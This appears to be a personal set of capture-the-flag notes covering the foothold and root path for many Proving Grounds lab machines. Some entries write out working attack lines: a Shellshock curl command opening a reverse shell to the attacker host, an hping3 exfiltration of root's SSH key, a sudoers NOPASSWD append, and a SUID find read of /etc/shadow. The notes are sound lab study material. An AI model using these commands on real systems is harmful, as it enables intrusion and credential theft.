# PG-HaNatraj
- Linux
- My writeup available on medium.
- LFI + SSH log poisoning chained for RCE.
- www-data to mahakal `sudo -l` => `apache2` sudo access + `/etc/apache2/apache2.conf` writeable (Refer Writeup on medium)
- mahakal to root `sudo -l` => `nmap` sudo access.

# PG-Katana
- Linux
- My writeup available on medium.
- File Upload to RCE using the PHPBash webshell script as the PHP reverseshell script fails to work. After getting the PHPBash web shell, simply got the reverse shell with `/dev/tcp/....`.
- Capability set (`getcap -r / 2>/dev/null`) found on `/usr/bin/python2.7` binary for root user. (GTFOBins)

# PG-Potato
- Linux
- My writeup available on medium.
- PHP strcmp function bypass technique.
- `nice` binary sudo privileges to get root shell using directory traversal.

# PG-Pwned1
- Linux
- My writeup available on medium.
- `docker` group privilege escalation.
Refer: https://www.hackingarticles.in/docker-privilege-escalation/

# PG-DC-1
- Linux
- Metasploit module, `exploit/unix/webapp/drupal_drupalgeddon2` for user shell.
- `find` SUID bit set for root. So, can be leveraged with `find /etc -type f -iname shadow -exec cat {} \;` to read sensitive files.

# PG-Solstice
- Linux
- LFI + Apache Log Poisoning
- Local webserver 'index.php' owned by root had file write permissions. So, used a PHP reverse shell script.

# PG-SoSimple
- Linux
- Wordpress Social Warfare <= 3.5.2 - Unauthenticated RCE.
Link: https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/
- `sudo -l`  => `sudo /usr/sbin/service ../../bin/sh`  => Restricted environments breakout.

# PG-DC-4
- Linux
- Login page Bruteforce Enumeration.
- Command Injection + SSH Bruteforce.
- `sudo -l` => `sudo /usr/bin/teehee -a /etc/sudoers` => This binary allows to append anything in a file. So, in the sudoers file appended `ALL ALL = NOPASSWD: /bin/bash` to attain a root bash shell with `sudo /bin/bash`.

# PG-DC-2
- Linux
- Username wordlist to locate users.
- `cewl` to scape the site to gather a password list.
- `ssh` to the target and finally to breakout of the **restricted bash environment**(`rbash`).
Link: https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e
- Now switched to user jerry with `su` and then, `sudo -l` => `/usr/bin/git` which can be used to spawn root shell. Refer GTFOBins.
Link: https://gtfobins.github.io/gtfobins/git/#sudo

# PG-DC-9
- Linux
- SQL Injection using `sqlmap` and dumping credentials.
- `Hydra` ssh bruteforce using a combined wordlist.
- Finally locaring a hidden file and locating a pass list and again used it for ssh bruteforcing.
- Finally `sudo -l` and located a custom binary that reads from a file and writes to another file. So, using it read `proof.txt`.

# PG-Photographer
- Linux
- Koken CMS.
- SMB Share having file credentials.
- Authentcated Koken PHP File Upload + RCE.
Link: https://www.exploit-db.com/exploits/48706
- Finally root SUID set on `PHP7.5` binary.
Link: https://gtfobins.github.io/gtfobins/php/#suid

# PG-InfosecPrep
- Linux
- Was a straightforward and quite CTFish on the foothold as we got the ssh private key.
- Now had root SUID bit set on `/bin/bash` binary.

# PG-Sumo
- Linux
- Found `cgi-bin/test` by directory bruteforce.
- So, this is related to the shellshock exploit. So, for shell, 
`curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<tun0>/6969 0>&1" http://192.168.237.87/cgi-bin/test`
- Now found dirty cow exploit with linux exploit suggester.
So, while compiling the exploit, we got `gcc: error trying to exec 'cc1': execvp: No such file or directory`
So, to tackle it we need to add the `/usr/lib/gcc/x86_64-linux-gnu/4.8/` path to the `PATH` variable.
So, use
`PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH`

# PG-ICMP
- Linux
- Monitorr web application RCE exploit.
Link: https://www.exploit-db.com/exploits/48980
- Got password for fox user in `crypt.php` file.(CTFish)
- `sudo -l` => `hping3` => So, from GTFO bins found the technique. This can allow us to read system files. So, rather than using `tun0` address as `RHOST`, we will use `127.0.0.1` such that the ICMP packets we recieve don't get out of order. So, that is possible only locally i.e. on a local IP i.e. `127.0.0.1`
Make 2 different SSH instances,
In 1st SSH instance,
```
sudo hping3 --icmp --listen xxx --dump 
```
In 2nd SSH instance,
```
RHOST=127.0.0.1
LFILE=/root/.ssh/id_rsa
sudo hping3 --icmp "$RHOST" --data 2000 --sign xxx --file "$LFILE"
```
So, on the 1st SSH instance, we will be able to capture the key.

# PG-Sar
- Linux
- Found a page on `robots.txt`.
- `sar2html` RCE exploit.
Link: https://www.exploit-db.com/exploits/47204
- CTFish privilege escalation i.e. a scheduled cronjob.

# PG-DriftingBlues6
- Linux
- Found a page on `robots.txt`
- Found a zip file. (CTFish)
And then used `zip2john` to crack it and got a credential to the `textpattern` CMS. 
- Logged in and exploited PHP upload RCE.
Refer: https://www.youtube.com/watch?v=J-t5ezd-V9M
- Finally DirtyCow kernal exploit.
Link: https://www.exploit-db.com/exploits/40616

# PG-Moneybox
- CTFish stegcrack.
- SSH bruteforce.
- Bash history file located way to switch to the other user i.e. by using the id_rsa file.
- `sudo -l` => `perl`

# PG-EvilBox-One
- Parameter fuzzing.
- Parameter vulnerable to LFI and used it to access the user from `/etc/passwd` and got the id_rsa ssh key file.
- Cracked the passphrase with `ssh2john` and logged in.
- And finally `/etc/passwd` was writeable. So, added another user with root permissions and switched to this new user.

# PG-Monitoring
- Got `nagiosxi` on port 80 and the credentials `nagiosadmin:admin` got the admin dashboard access.
- Found a PHP Root RCE exploit, that directly gave a rootshell.
Link: https://github.com/jakgibb/nagiosxi-root-rce-exploit/blob/master/exploit.php
